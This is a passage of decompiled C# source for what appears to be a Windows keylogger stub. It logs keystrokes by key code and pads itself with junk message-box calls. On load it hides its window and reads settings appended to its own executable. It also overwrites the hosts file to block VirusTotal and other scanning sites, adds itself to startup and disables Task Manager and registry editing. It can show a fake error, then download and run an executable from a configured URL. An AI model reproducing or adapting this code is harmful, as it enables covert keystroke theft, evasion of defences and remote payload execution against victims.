			{
				TextBox1.set_Text(TextBox1.get_Text() + "e");
			}
			else if ((int)Key == 70)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "f");
			}
			else if ((int)Key == 71)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "g");
			}
			else if ((int)Key == 72)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "h");
			}
			else if ((int)Key == 73)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "i");
			}
			else if ((int)Key == 74)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "j");
			}
			else if ((int)Key == 75)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "k");
			}
			else if ((int)Key == 76)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "l");
			}
			else if ((int)Key == 77)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "m");
			}
			else if ((int)Key == 78)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "n");
			}
			else if ((int)Key == 79)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "o");
			}
			else if ((int)Key == 80)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "p");
			}
			else if ((int)Key == 81)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "q");
			}
			else if ((int)Key == 82)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "r");
			}
			else if ((int)Key == 83)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "s");
			}
			else if ((int)Key == 84)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "t");
			}
			else if ((int)Key == 85)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "u");
			}
			else if ((int)Key == 86)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "v");
			}
			else if ((int)Key == 87)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "w");
			}
			else if ((int)Key == 88)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "x");
			}
			else if ((int)Key == 89)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "y");
			}
			else if ((int)Key == 90)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "z");
			}
			else if ((int)Key == 188)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ",");
			}
			else if ((int)Key == 189)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "-");
			}
			else if ((int)Key == 222)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "'");
			}
			else if ((int)Key == 219)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[");
			}
			else if ((int)Key == 221)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "]");
			}
			else if ((int)Key == 191)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "/");
			}
			else if ((int)Key == 220)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "\\");
			}
			else if ((int)Key == 186)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ";");
			}
			else if ((int)Key == 190)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ".");
			}
			else if ((int)Key == 192)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "`");
			}
			else if ((int)Key == 32)
			{
				TextBox1.set_Text(TextBox1.get_Text() + " ");
			}
			else if ((int)Key == 13)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "\r\n");
			}
			else if ((int)Key == 112)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F1]");
			}
			else if ((int)Key == 113)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F2]");
			}
			else if ((int)Key == 114)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F3]");
			}
			else if ((int)Key == 115)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F4]");
			}
			else if ((int)Key == 116)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F5]");
			}
			else if ((int)Key == 117)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F6]");
			}
			else if ((int)Key == 118)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F7]");
			}
			else if ((int)Key == 119)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F8]");
			}
			else if ((int)Key == 120)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F9]");
			}
			else if ((int)Key == 121)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F10]");
			}
			else if ((int)Key == 122)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F11]");
			}
			else if ((int)Key == 123)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F12]");
			}
			else if ((int)Key == 46)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[DEL]");
			}
			else if ((int)Key == 8)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[DEL]");
			}
			else if ((int)Key == 40)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 38)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 37)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 39)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 9)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[TAB]");
			}
			else if ((int)Key == 35)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[END]");
			}
			else if ((int)Key == 27)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[ESC]");
			}
			else if ((int)Key == 111)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "/");
			}
			else if ((int)Key == 110)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ".");
			}
			else if ((int)Key == 109)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "-");
			}
			else if ((int)Key == 107)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "+");
			}
			else if ((int)Key == 106)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "*");
			}
		}
		else if (((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() & !((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
		{
			if ((int)Key == 49)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "!");
			}
			else if ((int)Key == 50)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "@");
			}
			else if ((int)Key == 51)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "#");
			}
			else if ((int)Key == 52)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "$");
			}
			else if ((int)Key == 53)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "%");
			}
			else if ((int)Key == 54)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "^");
			}
			else if ((int)Key == 55)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "&");
			}
			else if ((int)Key == 56)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "*");
			}
			else if ((int)Key == 57)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "(");
			}
			else if ((int)Key == 48)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ")");
			}
			else if ((int)Key == 65)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "A");
			}
			else if ((int)Key == 66)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "B");
			}
			else if ((int)Key == 67)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "C");
			}
			else if ((int)Key == 68)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "D");
			}
			else if ((int)Key == 69)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "E");
			}
			else if ((int)Key == 70)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "F");
			}
			else if ((int)Key == 71)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "G");
			}
			else if ((int)Key == 72)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "H");
			}
			else if ((int)Key == 73)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "I");
			}
			else if ((int)Key == 74)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "J");
			}
			else if ((int)Key == 75)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "K");
			}
			else if ((int)Key == 76)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "L");
			}
			else if ((int)Key == 77)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "M");
			}
			else if ((int)Key == 78)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "N");
			}
			else if ((int)Key == 79)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "O");
			}
			else if ((int)Key == 80)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "P");
			}
			else if ((int)Key == 81)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Q");
			}
			else if ((int)Key == 82)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "R");
			}
			else if ((int)Key == 83)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "S");
			}
			else if ((int)Key == 84)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "T");
			}
			else if ((int)Key == 85)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "U");
			}
			else if ((int)Key == 86)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "V");
			}
			else if ((int)Key == 87)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "W");
			}
			else if ((int)Key == 88)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "X");
			}
			else if ((int)Key == 89)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Y");
			}
			else if ((int)Key == 90)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Z");
			}
			else if ((int)Key == 188)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "<");
			}
			else if ((int)Key == 189)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "_");
			}
			else if ((int)Key == 219)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "{");
			}
			else if ((int)Key == 221)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "}");
			}
			else if ((int)Key == 191)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 220)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "|");
			}
			else if ((int)Key == 186)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ":");
			}
			else if ((int)Key == 190)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ">");
			}
			else if ((int)Key == 192)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "~");
			}
			else if ((int)Key == 32)
			{
				TextBox1.set_Text(TextBox1.get_Text() + " ");
			}
			else if ((int)Key == 13)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "\r\n");
			}
			else if ((int)Key == 112)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F1]");
			}
			else if ((int)Key == 113)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F2]");
			}
			else if ((int)Key == 114)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F3]");
			}
			else if ((int)Key == 115)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F4]");
			}
			else if ((int)Key == 116)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F5]");
			}
			else if ((int)Key == 117)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F6]");
			}
			else if ((int)Key == 118)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F7]");
			}
			else if ((int)Key == 119)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F8]");
			}
			else if ((int)Key == 120)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F9]");
			}
			else if ((int)Key == 121)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F10]");
			}
			else if ((int)Key == 122)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F11]");
			}
			else if ((int)Key == 123)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F12]");
			}
			else if ((int)Key == 46)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[DEL]");
			}
			else if ((int)Key == 8)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[DEL]");
			}
			else if ((int)Key == 40)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 38)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 37)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 39)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 9)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[TAB]");
			}
			else if ((int)Key == 35)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[END]");
			}
			else if ((int)Key == 27)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[ESC]");
			}
			else if ((int)Key == 111)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "/");
			}
			else if ((int)Key == 110)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ".");
			}
			else if ((int)Key == 109)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "-");
			}
			else if ((int)Key == 107)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "+");
			}
			else if ((int)Key == 106)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "*");
			}
		}
	}

	public void ghghsdfhmhdgk()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_0062: Unknown result type (might be due to invalid IL or missing references)
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_04e0: Unknown result type (might be due to invalid IL or missing references)
		Timer2.Start();
		((Control)this).set_Visible(false);
		FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
		checked
		{
			text1 = Strings.Space((int)FileSystem.LOF(1));
			text2 = Strings.Space((int)FileSystem.LOF(1));
			interval = Strings.Space((int)FileSystem.LOF(1));
			cb = Strings.Space((int)FileSystem.LOF(1));
			cb2 = Strings.Space((int)FileSystem.LOF(1));
			cb3 = Strings.Space((int)FileSystem.LOF(1));
			cb3 = Strings.Space((int)FileSystem.LOF(1));
			cb4 = Strings.Space((int)FileSystem.LOF(1));
			cb5 = Strings.Space((int)FileSystem.LOF(1));
			Title = Strings.Space((int)FileSystem.LOF(1));
			msg = Strings.Space((int)FileSystem.LOF(1));
			DownloadUrl = Strings.Space((int)FileSystem.LOF(1));
			fakeerrorchecker = Strings.Space((int)FileSystem.LOF(1));
			tdownloaderchecker = Strings.Space((int)FileSystem.LOF(1));
			FileSystem.FileGet(1, ref text1, -1L, false);
			FileSystem.FileGet(1, ref text2, -1L, false);
			FileSystem.FileGet(1, ref interval, -1L, false);
			FileSystem.FileGet(1, ref cb, -1L, false);
			FileSystem.FileGet(1, ref cb2, -1L, false);
			FileSystem.FileGet(1, ref cb3, -1L, false);
			FileSystem.FileGet(1, ref cb4, -1L, false);
			FileSystem.FileGet(1, ref cb5, -1L, false);
			FileSystem.FileGet(1, ref Title, -1L, false);
			FileSystem.FileGet(1, ref msg, -1L, false);
			FileSystem.FileGet(1, ref DownloadUrl, -1L, false);
			FileSystem.FileGet(1, ref fakeerrorchecker, -1L, false);
			FileSystem.FileGet(1, ref tdownloaderchecker, -1L, false);
			FileSystem.FileClose(new int[1] { 1 });
			options = Strings.Split(text1, "/lfgvealviajehfbas/", -1, (CompareMethod)0);
			TextBox2.set_Text(options[1]);
			TextBox3.set_Text(options[2]);
			TextBox4.set_Text(options[3]);
			if (Conversions.ToBoolean(options[4]))
			{
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
				string path = folderPath + "\\drivers\\etc\\\\hosts";
				StreamWriter streamWriter = new StreamWriter(path);
				streamWriter.Write("##Hosts file edit");
				streamWriter.Write(Environment.NewLine);
				streamWriter.Write("127.0.0.1 www.virustotal.com");
				streamWriter.Write(Environment.NewLine);
				streamWriter.Write("127.0.0.1 virustotal.com");
				streamWriter.Write(Environment.NewLine);
				streamWriter.Write("127.0.0.1 www.novirusthanks.org");
				streamWriter.Write(Environment.NewLine);
				streamWriter.Write("127.0.0.1 novirusthanks.org");
				streamWriter.Write(Environment.NewLine);
				streamWriter.Write("127.0.0.1 www.virscan.org");
				streamWriter.Write(Environment.NewLine);
				streamWriter.Write("127.0.0.1 virscan.org");
				streamWriter.Write(Environment.NewLine);
				streamWriter.Write("127.0.0.1 www.virusscan.jotti.org");
				streamWriter.Write(Environment.NewLine);
				streamWriter.Write("127.0.0.1 virusscan.jotti.org");
				streamWriter.Write(Environment.NewLine);
				streamWriter.Write("127.0.0.1 virusscan.jotti.org");
				streamWriter.Write(Environment.NewLine);
				streamWriter.Write("127.0.0.1 209.85.135.99");
				streamWriter.Dispose();
			}
			if (Conversions.ToBoolean(options[5]))
			{
				AddStartup(((Form)this).get_Text(), Application.get_ExecutablePath());
			}
			if (Conversions.ToBoolean(options[6]))
			{
				Timer3.Start();
			}
			if (Conversions.ToBoolean(options[7]))
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies", writable: true);
				registryKey.CreateSubKey("System");
				registryKey.Close();
				try
				{
					Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			if (Conversions.ToBoolean(options[8]))
			{
				RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies", writable: true);
				registryKey2.CreateSubKey("System");
				registryKey2.Close();
				try
				{
					Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("DisableRegistryTools", "1", RegistryValueKind.DWord);
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
			if (Conversions.ToBoolean(options[12]))
			{
				MessageBox.Show(options[10], options[9], (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
			if (Conversions.ToBoolean(options[13]))
			{
				string text = Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\Downloaded.exe";
				try
				{
					if (File.Exists(text))
					{
						File.Delete(text);
						((ServerComputer)MyProject.Computer).get_Network().DownloadFile(options[11], text);
						Process.Start(text);
					}
					else
					{
						((ServerComputer)MyProject.Computer).get_Network().DownloadFile(options[11], text);
						Process.Start(text);
					}
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.EndApp();
					ProjectData.ClearProjectError();
				}
			}
			TextBox4.set_Text(Conversions.ToString(Convert.ToInt32(options[3])));
			Timer1.set_Interval(Conversions.ToInteger(TextBox4.get_Text()));
			Timer1.Start();
		}
	}

	public void ghk3knasdf()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_0062: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Unknown result type (might be due to invalid IL or missing references)
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_010b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0118: Unknown result type (might be due to invalid IL or missing references)
		//IL_0125: Unknown result type (might be due to invalid IL or missing references)
		//IL_0132: Unknown result type (might be due to invalid IL or missing references)
		//IL_013f: Unknown result type (might be due to invalid IL or missing references)
		//IL_014c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0159: Unknown result type (might be due to invalid IL or missing references)
		//IL_0166: Unknown result type (might be due to invalid IL or missing references)
		//IL_0173: Unknown result type (might be due to invalid IL or missing references)
		//IL_0180: Unknown result type (might be due to invalid IL or missing references)
		//IL_018d: Unknown result type (might be due to invalid IL or missing references)
		//IL_019a: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_01db: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0202: Unknown result type (might be due to invalid IL or missing references)
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
